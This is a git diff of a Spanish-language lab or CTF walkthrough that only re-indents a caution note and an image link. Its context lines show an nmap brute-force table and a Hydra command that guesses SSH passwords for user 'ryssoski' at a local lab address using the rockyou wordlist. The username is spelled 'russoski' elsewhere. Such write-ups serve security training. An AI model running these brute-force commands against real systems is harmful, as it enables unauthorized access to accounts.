@@ -133,12 +133,12 @@ Cómo ya conocemos el usuario, podemos realizar un ataque de fuerza bruta para e
     | --script-args userdb=users.txt | Proporciona el archivo con lista de usuarios para el ataque. |
     | --min-rate 5000 | Envía al menos 5000 paquetes por segundo (aumenta velocidad). |
 
-    >[!CAUTION]
-    >
-    >Se debe crear con un editor de texto cómo **nano**  llamado **users.txt** con el usuario russoski dentro.
+>[!CAUTION]
+>
+>Se debe crear con un editor de texto cómo **nano**  llamado **users.txt** con el usuario russoski dentro.
 
 
-    ![Nmap Fuerza Bruta](img/nmap_fbruta.png)
+  ![Nmap Fuerza Bruta](img/nmap_fbruta.png)
 
 - **Hydra [RECOMENDADO]**: hydra -l ryssoski -P /usr/share/wordlists/rockyou.txt.gz ssh://172.17.0.2 -t 64
 
